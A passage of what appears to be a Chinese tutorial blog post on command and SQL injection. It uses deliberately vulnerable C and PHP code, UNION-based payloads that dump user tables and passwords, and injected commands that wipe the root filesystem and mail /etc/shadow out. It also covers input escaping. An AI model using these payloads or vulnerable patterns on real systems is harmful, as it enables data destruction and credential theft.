title=\"初步注入\"></a>初步注入</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' or '</span>1<span class=\"string\">'='</span>1</span><br></pre></td></tr></table></figure>\n<h3 id=\"猜测查询语句的字段数\"><a href=\"#猜测查询语句的字段数\" class=\"headerlink\" title=\"猜测查询语句的字段数\"></a>猜测查询语句的字段数</h3><p>即要对查询语句<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> first_name,last_name <span class=\"keyword\">FROM</span> <span class=\"keyword\">users</span> <span class=\"keyword\">WHERE</span> user_id = <span class=\"string\">'$content'</span></span><br></pre></td></tr></table></figure></p>\n<p>中的<code>SELECT</code>字段进行猜测<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' or 1=1 order by 1 #</span><br><span class=\"line\">1'</span> or 1=1 order by 2 <span class=\"comment\">#</span></span><br><span class=\"line\">1<span class=\"string\">' or 1=1 order by 3 #</span></span><br></pre></td></tr></table></figure></p>\n<p>尝试到3时出现<code>No Found</code>说明<code>SELECT</code>里有两个字段数</p>\n<h3 id=\"查询刚刚猜测的字段顺序\"><a href=\"#查询刚刚猜测的字段顺序\" class=\"headerlink\" title=\"查询刚刚猜测的字段顺序\"></a>查询刚刚猜测的字段顺序</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' union select 1,2 #</span></span><br></pre></td></tr></table></figure>\n<p><code>sql</code>语法<code>union</code>是将两个集合去重合并，相当于原本返回<code>admin,admin</code>，现在又存在<code>1,2</code>，通过<code>union</code>后就是两行数据</p>\n<h3 id=\"获取当前数据库名\"><a href=\"#获取当前数据库名\" class=\"headerlink\" title=\"获取当前数据库名\"></a>获取当前数据库名</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' union select 1,database() #</span></span><br></pre></td></tr></table></figure>\n<p><code>database()</code>是数据库系统信息函数，作用是获取当前数据库名，其他数据库信息函数有</p>\n<table>\n<thead>\n<tr>\n<th>函数</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>version()</td>\n<td>获取数据库的版本号</td>\n</tr>\n<tr>\n<td>connection_id()</td>\n<td>获取数据库的连接数</td>\n</tr>\n<tr>\n<td>database();schema()</td>\n<td>获取当前数据库名</td>\n</tr>\n<tr>\n<td>user();system_user()</td>\n<td>获取当前用户</td>\n</tr>\n<tr>\n<td>current_user()</td>\n<td>获取当前用户</td>\n</tr>\n<tr>\n<td>charset(str)</td>\n<td>获取字符串str的字符集</td>\n</tr>\n<tr>\n<td>collation(str)</td>\n<td>获取字符串str的字符排列方式</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"获取当前表名\"><a href=\"#获取当前表名\" class=\"headerlink\" title=\"获取当前表名\"></a>获取当前表名</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br></pre></td></tr></table></figure>\n<p><code>mysql</code>在创建时默认创建一个information_schema数据库，在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</p>\n<p><code>information_schema</code>数据库表说明:</p>\n<ul>\n<li><code>SCHEMATA</code>表：提供了当前mysql实例中所有数据库的信息。<code>show databases</code>的结果取之此表。</li>\n<li><code>TABLES</code>表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。<code>show tables from schemaname</code>的结果取之此表。</li>\n<li><code>COLUMNS</code>表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<code>show columns from schemaname.tablename</code>的结果取之此表。</li>\n<li><code>STATISTICS</code>表：提供了关于表索引的信息。<code>show index from schemaname.tablename</code>的结果取之此表。</li>\n<li><code>USER_PRIVILEGES</code>（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</li>\n<li><code>VIEWS</code>表：给出了关于数据库中的视图的信息。需要有<code>show views</code>权限，否则无法查看视图信息</li>\n<li><code>TRIGGERS</code>表：提供了关于触发程序的信息。必须有super权限才能查看该表</li>\n</ul>\n<h3 id=\"获取当前表字段名\"><a href=\"#获取当前表字段名\" class=\"headerlink\" title=\"获取当前表字段名\"></a>获取当前表字段名</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>users<span class=\"string\">' #</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"获取所有数据\"><a href=\"#获取所有数据\" class=\"headerlink\" title=\"获取所有数据\"></a>获取所有数据</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1<span class=\"string\">' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"视频\"><a href=\"#视频\" class=\"headerlink\" title=\"视频\"></a>视频</h3><div class=\"video-container\"><iframe src=\"//www.youtube.com/embed/UwJr-RsEy58\" frameborder=\"0\" allowfullscreen></iframe></div>\n<h2 id=\"php-注入\"><a href=\"#php-注入\" class=\"headerlink\" title=\"php 注入\"></a>php 注入</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"string\">\"查看文件\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"string\">\"&lt;p&gt;\"</span>);</span><br><span class=\"line\">$file=$_GET[<span class=\"string\">'filename'</span>];</span><br><span class=\"line\">system(<span class=\"string\">\"cat $file\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>与c代码注入类似，基本在于调用系统的命令来获取结果，诸如php获取系统版本、mysql版本、服务器时间、Web服务器类型等等系统信息，使用系统命令，都可能会产生注入漏洞。在本例中仍然可以在url中注入一些系统命令。</p>\n<h2 id=\"注入防范\"><a href=\"#注入防范\" class=\"headerlink\" title=\"注入防范\"></a>注入防范</h2><p>明白注入的基本方式和原理，很容易知道，通过输入检查来预防注入。获取到输入的字符串，对字符串进行过滤、转义等操作，只不过诸如php的不同输入检查函数，不同的函数的检查方法不一样，但有可能仍然存在编写者本身没有考虑到的可能性，这就导致了漏洞不间断出现。在使用这些检查函数时，要认真查看函数的检查方法以及过滤的东西。在此举个例子:</p>\n<p><code>mysqli_real_escape_string( mysqli $link , string $escapestr)</code>:</p>\n<ul>\n<li>Parameters:<ul>\n<li>link: Procedural style only: A link identifier returned by mysqli_connect() or mysqli_init()</li>\n<li>escapestr: The string to be escaped. Characters encoded are NUL (ASCII 0), \\n, \\r, \\, ‘, “, and Control-Z.</li>\n</ul>\n</li>\n<li>Return Value:<ul>\n<li>Returns an escaped string.</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$mysqli = <span class=\"keyword\">new</span> mysqli(<span class=\"string\">\"localhost\"</span>, <span class=\"string\">\"my_user\"</span>, <span class=\"string\">\"my_password\"</span>, <span class=\"string\">\"world\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* check connection */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (mysqli_connect_errno()) &#123;</span><br><span class=\"line\">    printf(<span class=\"string\">\"Connect failed: %s\\n\"</span>, mysqli_connect_error());</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$mysqli-&gt;query(<span class=\"string\">\"CREATE TEMPORARY TABLE myCity LIKE City\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$city = <span class=\"string\">\"'s Hertogenbosch\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* this query will fail, cause we didn't escape $city */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!$mysqli-&gt;query(<span class=\"string\">\"INSERT into myCity (Name) VALUES ('$city')\"</span>)) &#123;</span><br><span class=\"line\">    printf(<span class=\"string\">\"Error: %s\\n\"</span>, $mysqli-&gt;sqlstate);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$city = $mysqli-&gt;real_escape_string($city);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* this query with escaped $city will work */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($mysqli-&gt;query(<span class=\"string\">\"INSERT into myCity (Name) VALUES ('$city')\"</span>)) &#123;</span><br><span class=\"line\">    printf(<span class=\"string\">\"%d Row inserted.\\n\"</span>, $mysqli-&gt;affected_rows);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$mysqli-&gt;close();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"引用地址\"><a href=\"#引用地址\" class=\"headerlink\" title=\"引用地址\"></a>引用地址</h2><ul>\n<li><a href=\"http://www.freebuf.com/articles/web/120747.html\" target=\"_blank\" rel=\"external\">http://www.freebuf.com/articles/web/120747.html</a></li>\n<li><a href=\"http://topspeedsnail.com/hack-command-injection-attack/\" target=\"_blank\" rel=\"external\">http://topspeedsnail.com/hack-command-injection-attack/</a></li>\n</ul>\n","excerpt":"<h2 id=\"c程序代码注入\"><a href=\"#c程序代码注入\" class=\"headerlink\" title=\"c程序代码注入\"></a>c程序代码注入</h2><p>c程序:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char *argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar src[100], dst[100], cmd[205] = <span class=\"string\">\"cp \"</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter name of source file:\"</span>);</span><br><span class=\"line\">\tgets(src);</span><br><span class=\"line\">\tstrcat(cmd, src);</span><br><span class=\"line\">\tstrcat(cmd, <span class=\"string\">\" \"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter name of destination file:\"</span>);</span><br><span class=\"line\">\tgets(dst);</span><br><span class=\"line\">\tstrcat(cmd, dst);</span><br><span class=\"line\">\tsystem(cmd);</span><br><span class=\"line\">\t<span class=\"built_in\">return</span> 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>","more":"<p>程序本身是要求输入一个拷贝源文件和拷贝目标文件，将源文件内容拷贝到目标文件,正常执行:<br><img src=\"/images/attacks.png\" alt=\"\"></p>\n<p>异常代码注入<br><img src=\"/images/attacks2.png\" alt=\"\"></p>\n<p>同时还能干这些事情<br>删除根目录，你可以试试<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp hello world; rm -rf / --no-preserve-root</span><br></pre></td></tr></table></figure></p>\n<p>将linux系统的密码文件通过邮件发送<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp hello world; mail ****@****.com &lt; /etc/shadow</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"SQL代码注入\"><a href=\"#SQL代码注入\" class=\"headerlink\" title=\"SQL代码注入\"></a>SQL代码注入</h2><p><code>index.html</code><br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://code.jquery.com/jquery-3.2.1.slim.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\"</span> <span class=\"attr\">integrity</span>=<span class=\"string\">\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>sql 注入测试<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"card\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 20rem;\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"card-body\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span> <span class=\"attr\">action</span>=<span class=\"string\">\"index.php\"</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"form-group\"</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">class</span>=<span class=\"string\">\"col-form-label\"</span> <span class=\"attr\">for</span>=<span class=\"string\">\"formGroupExampleInput\"</span>&gt;</span>SQL query<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"form-control\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"content\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"content\"</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">\"Example input\"</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"btn btn-primary\"</span>&gt;</span>Submit<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><code>index.php</code><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;head&gt;</span><br><span class=\"line\">        &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\">        &lt;link rel=<span class=\"string\">\"stylesheet\"</span> href=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\"</span> integrity=<span class=\"string\">\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://code.jquery.com/jquery-3.2.1.slim.min.js\"</span> integrity=<span class=\"string\">\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\"</span> integrity=<span class=\"string\">\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;script src=<span class=\"string\">\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\"</span> integrity=<span class=\"string\">\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\"</span> crossorigin=<span class=\"string\">\"anonymous\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">        &lt;title&gt;SQL 注入&lt;/title&gt;</span><br><span class=\"line\">    &lt;/head&gt;</span><br><span class=\"line\">    &lt;body&gt;</span><br><span class=\"line\">        <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($_POST[content]) &#123;</span><br><span class=\"line\">            $db_host = <span class=\"string\">\"localhost\"</span>;</span><br><span class=\"line\">            $db_user = <span class=\"string\">\"my_user\"</span>;</span><br><span class=\"line\">            $db_password = <span class=\"string\">\"my_password\"</span>;</span><br><span class=\"line\">            $db_name = <span class=\"string\">\"my_db\"</span>;</span><br><span class=\"line\">            $content = $_POST[content];</span><br><span class=\"line\">            $query = <span class=\"string\">\"SELECT * FROM users WHERE name = '$content'\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            $conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);</span><br><span class=\"line\">            $result = mysqli_query($conn, $query);</span><br><span class=\"line\"></span><br><span class=\"line\">            var_dump();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mysqli_num_rows($result)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> ($row = mysqli_fetch_array($result)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">\"Your name is \"</span> . $row[<span class=\"number\">1</span>] . <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">\"No Found!\"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            mysqli_close($conn);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            var_dump($_POST);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"Don't get your content!\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>表中数据<br><img src=\"/images/sql1.png\" alt=\"\"><br>正常输入<br><img src=\"/images/sql2.png\" alt=\"\"><br><img src=\"/images/sql3.png\" alt=\"\"><br><img src=\"/images/sql4.png\" alt=\"\"><br><img src=\"/images/sql5.png\" alt=\"\"><br>异常输入<br><img src=\"/images/sql6.png\" alt=\"\"><br><img src=\"/images/sql7.png\" alt=\"\"></p>\n<p>问题在于<code>SELECT * FROM users WHERE name = &#39;$content&#39;</code>在接收前端输入的字符串时，直接拼接查询语句,当输入为<code>hello&#39; OR 1=1 #</code>时,将语句拼接完成就是<code>SELECT * FROM users WHERE name = &#39;hello&#39; OR 1=1 #&#39;</code>,其中<code>hello</code>后的一个单引号将查询语句的第一个单引号关闭了,接下来就是<code>OR</code>语句的真子句,最后将多余的单引号注释掉,那么这个查询永远为真,查询语句就会将数据库中所有的数据都返回。</p>\n<h2 id=\"SQL注入续\"><a href=\"#SQL注入续\" class=\"headerlink\" title=\"SQL注入续\"></a>SQL注入续</h2><p><code>low.php</code><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$db_host = <span class=\"string\">\"localhost\"</span>;</span><br><span class=\"line\">$db_user = <span class=\"string\">\"my_user\"</span>;</span><br><span class=\"line\">$db_password = <span class=\"string\">\"my_password\"</span>;</span><br><span class=\"line\">$db_name = <span class=\"string\">\"my_db\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$user = $_POST[ <span class=\"string\">'username'</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">$pass = $_POST[ <span class=\"string\">'password'</span> ];</span><br><span class=\"line\">$pass = md5( $pass );</span><br><span class=\"line\"></span><br><span class=\"line\">$query  = <span class=\"string\">\"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"</span>;</span><br><span class=\"line\">$conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);</span><br><span class=\"line\">$result = mysqli_query($conn, $query);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">\t$row    = mysqli_fetch_assoc( $result );</span><br><span class=\"line\">\t$avatar = $row[<span class=\"string\">\"avatar\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;img src=\\\"&#123;$avatar&#125;\\\" /&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">mysqli_close($conn);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><code>medium.php</code><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 